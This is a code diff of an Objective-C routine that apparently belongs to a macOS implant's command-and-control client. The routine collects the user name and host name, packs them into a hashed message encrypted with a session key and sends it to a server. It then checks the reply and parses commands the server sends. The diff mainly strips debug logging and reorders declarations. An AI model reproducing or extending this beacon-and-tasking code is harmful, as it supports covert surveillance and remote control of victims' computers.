@@ -46,29 +46,25 @@
 }
 
 - (BOOL)perform
-{
-#ifdef DEBUG_ID_NOP
-  infoLog(@"");
-#endif
-  
+{ 
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  uint32_t command    = PROTO_ID;
-  NSString *userName  = NSUserName();
   
   int i = 0;
   uint32_t _command;
-  
   char tempHost[100];
   NSString *hostName;
+  NSString *sourceID = @"";
+
+  uint32_t command    = PROTO_ID;
+  NSString *userName  = NSUserName();
+
   if (gethostname(tempHost, 100) == 0)
     hostName = [NSString stringWithUTF8String: tempHost];
   else
     hostName = @"EMPTY";
   
-  NSString *sourceID = @"";
-  
   NSMutableData *message = [[NSMutableData alloc] init];
+  
   // command PROTO_ID
   [message appendBytes: &command
                 length: sizeof(command)];
@@ -84,11 +80,7 @@
   // sha1 check
   NSData *messageSha = [message sha1Hash];
   [message appendData: messageSha];
-  
-#ifdef DEBUG_ID_NOP
-  infoLog(@"message: %@", message);
-#endif
-  
+
   //
   // Send encrypted message
   //
@@ -96,21 +88,19 @@
   NSData *replyData           = nil;
   
   [message encryptWithKey: gSessionKey];
+  
   replyData = [mTransport sendData: message
                  returningResponse: urlResponse];
   
   if (replyData == nil)
     {
-#ifdef DEBUG_ID_NOP
-      errorLog(@"empty reply from server");
-#endif
       [message release];
       [outerPool release];
 
       return NO;
     }
 
-  NSMutableData *decData      = [[NSMutableData alloc] initWithData: replyData];
+  NSMutableData *decData = [[NSMutableData alloc] initWithData: replyData];
   [decData decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_ID_NOP
@@ -143,27 +133,14 @@
                   NSMakeRange(0, [decData length] - CC_SHA1_DIGEST_LENGTH)];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_ID_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
-      
+    {  
       return NO;
     }
   
   shaLocal = [shaLocal sha1Hash];
-  
-#ifdef DEBUG_ID_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
-  
+
   if ([shaRemote isEqualToData: shaLocal] == NO)
-    {
-#ifdef DEBUG_ID_NOP
-      errorLog(@"sha mismatch");
-#endif
-      
+    {  
       [message release];
       [decData release];
       [outerPool release];
@@ -172,11 +149,7 @@
     }
   
   if (responseCommand != PROTO_OK)
-    {
-#ifdef DEBUG_ID_NOP
-      errorLog(@"response != PROTO_OK (%d)", responseCommand);
-#endif
-      
+    {      
       [message release];
       [decData release];
       [outerPool release];
@@ -195,14 +168,8 @@
 #ifdef DEBUG_ID_NOP
       errorLog(@"exception on serverTime makerange (%@)", [e reason]);
 #endif
-      
       //return NO;
     }
-  
-#ifdef DEBUG_ID_NOP
-  NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: serverTime];
-  infoLog(@"givenDate: %@", givenDate);
-#endif
   
   uint32_t numOfCommands = 0;
   
@@ -230,11 +197,7 @@
       
       return YES;
     }
-  
-#ifdef DEBUG_ID_NOP
-  infoLog(@"We have (%d) command(s) requested from the server", numOfCommands);
-#endif
-  
+
   //
   // Parse all the commands
   //
